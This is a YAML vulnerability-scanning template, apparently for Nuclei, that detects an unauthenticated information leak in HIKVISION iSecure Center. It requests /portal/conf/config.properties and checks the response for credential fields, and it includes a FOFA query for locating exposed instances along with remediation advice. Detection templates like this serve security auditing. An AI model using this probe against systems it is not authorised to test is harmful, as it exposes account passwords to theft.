id: hikvision-isecure-info-leak

info:
  name: HIKVISION iSecure Center - Information Leak
  author: adeljck
  severity: high
  description: |
    该模板用于检测 HIKVISION iSecure Center - Information Leak。该类漏洞通常源于敏感接口、配置文件、错误信息或调试数据被未授权暴露。模板主要向 `/portal/conf/config.properties` 等路径发送探测请求，并根据响应中的 `@bic`、`username` 等特征确认漏洞是否存在。
  impact: |
    - 攻击者可获取路径、配置、账号、令牌、日志或其他敏感信息。
    - 泄露的信息可能被用于定位系统结构、复用凭据、绕过访问控制或辅助后续攻击。
  remediation: |
    - 移除或限制敏感接口、调试页面、配置文件和日志文件的外部访问。
    - 对错误信息和接口响应进行最小化处理，避免返回内部路径、账号、密钥或堆栈信息。
    - 轮换已暴露的凭据和令牌，并检查相关账号的访问记录。
  reference:
    - https://github.com/adeljck/Hikvision_Info_Leak
    - https://github.com/wy876/POC/blob/main/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="HIKVISION-综合安防管理平台"
  tags: info-leak,iot,hikvision,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/portal/conf/config.properties"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '@bic'
          - 'username'
          - 'password'
        condition: and

      - type: status
        status:
          - 200
